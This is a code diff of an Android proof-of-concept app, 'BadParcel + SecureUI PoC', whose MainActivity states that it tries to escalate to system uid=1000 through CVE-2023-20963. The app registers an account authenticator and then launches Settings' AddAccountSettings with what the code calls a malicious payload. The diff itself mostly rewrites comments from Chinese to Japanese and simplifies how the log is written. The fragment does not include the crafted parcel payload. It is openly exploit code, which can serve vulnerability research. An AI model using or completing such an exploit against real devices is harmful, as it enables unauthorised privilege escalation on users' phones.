@@ -13,7 +13,6 @@ import android.util.Log;
 
 import java.io.File;
 import java.io.FileOutputStream;
-import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
 import java.text.SimpleDateFormat;
 import java.util.Date;
@@ -31,7 +30,7 @@ public class MainActivity extends Activity {
         appendLog("[*] BadParcel + SecureUI PoC started.");
         appendLog("[*] Attempting to escalate to uid=1000 via CVE-2023-20963...");
 
-        // 1. 先触发 addAccount 以注册 Authenticator
+        // 1. 強制的に認証サービスを登録（一度呼び出す）
         try {
             AccountManager am = (AccountManager) getSystemService(Context.ACCOUNT_SERVICE);
             am.addAccount("com.example.tzpoc", null, null, null, this, null, null);
@@ -40,7 +39,7 @@ public class MainActivity extends Activity {
             appendLog("[+] addAccount triggered: " + e.getMessage());
         }
 
-        // 2. 启动 Settings 的 AddAccountSettings，传递我们的 account_type
+        // 2. AddAccountSettings を起動
         Intent attacker = new Intent();
         attacker.setComponent(new ComponentName(
                 "com.android.settings",
@@ -53,7 +52,7 @@ public class MainActivity extends Activity {
         startActivity(attacker);
         appendLog("[+] AddAccountSettings launched with malicious payload.");
 
-        // 3. 延迟退出，等待 ProofActivity 被启动
+        // 3. 10秒後に終了
         new Handler(Looper.getMainLooper()).postDelayed(() -> {
             appendLog("[*] PoC finished. Check logcat and /sdcard/Download/ for proof.");
             saveLog();
@@ -61,7 +60,6 @@ public class MainActivity extends Activity {
         }, 10000);
     }
 
-    // ログ蓄積
     public static void appendLog(String msg) {
         String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
         String line = "[" + ts + "] " + msg + "\n";
@@ -74,7 +72,7 @@ public class MainActivity extends Activity {
             File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
             if (!dir.exists() && !dir.mkdirs()) return;
             File file = new File(dir, "badparcel_poc_log.txt");
-            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file)))) {
+            try (PrintWriter pw = new PrintWriter(new FileOutputStream(file))) {
                 pw.print(logBuilder.toString());
             }
             appendLog("[+] Log saved to " + file.getAbsolutePath());
